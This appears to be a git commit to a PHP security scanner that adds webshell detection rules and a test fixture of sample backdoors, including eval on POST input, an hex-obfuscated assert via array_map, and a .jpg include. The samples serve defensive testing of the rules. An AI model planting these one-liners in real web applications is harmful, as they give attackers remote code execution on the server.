f2f1ed1604ec3003f400e0585134bf1f71eb32e8
braveghz <braveghz@gmail.com>
2017-08-31 17:10:36 +0800

    修改CVI-360001 CVI-360002 CVI-360003 CVI-360007 增加webshell规则

---
+++ tests/vulnerabilities/webshell.php
@@ -0,0 +1,18 @@
+<?php
+//cvi-360001
+eval($_POST['C']);
+
+//cvi-360002
+$a="ss";
+include("sss.jpg");
+
+//cvi-360003
+echo '###m7lrvok###';$a=$_POST['m7lrv'];$b;$b=$a;@eval($a)
+
+//cvi-360007
+array_map("ass\x65rt",(array)$_REQUEST['expdoor']);
+
+//cvi-360008
+
+?>
+
